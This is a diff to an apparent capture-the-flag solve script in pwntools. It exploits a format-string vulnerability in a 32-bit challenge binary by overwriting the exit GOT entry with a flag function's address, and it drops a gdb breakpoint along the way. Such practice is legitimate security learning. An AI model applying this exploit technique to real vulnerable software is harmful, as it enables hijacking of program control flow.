@@ -4,6 +4,8 @@ from formatStringExploiter.FormatString import FormatString
 
 elf = ELF('32_new')
 
+#context.log_level = 'DEBUG'
+
 
 def exec_fmt(pl):
     with process('./32_new') as p:
@@ -16,10 +18,6 @@ def exec_fmt(pl):
 
 def attack(pl):
     with process('./32_new') as p:
-        gdb.attach(p, '''
-        b *0x080487f5
-        continue
-        ''')
         p.recvuntil('pwner, whats your name?\n')
         p.sendline(pl)
         p.recvuntil('Till then Bye')
@@ -43,7 +41,7 @@ def remote_atk(pl):
 # 0x84a8751
 # 0x804870b
 flag = elf.symbols['_Z4flagv']
-flag = 0x7be86c5
+#flag = 0x7be86c5
 # 0x61a761a7
 print hex(flag)
 exit_got = elf.symbols['got.exit']
@@ -54,6 +52,5 @@ print hex(printf_plt)
 #payload = fmtstr_payload(10, {exit_got: flag})
 # attack(payload)
 
-payload = FormatString(remote_atk, elf=elf, index=10, pad=0,
-                       bad_chars='\n', bits=32, explore_stack=False)
+payload = FormatString(attack, elf=elf, index=10, explore_stack=False)
 payload.write_q(exit_got, flag)
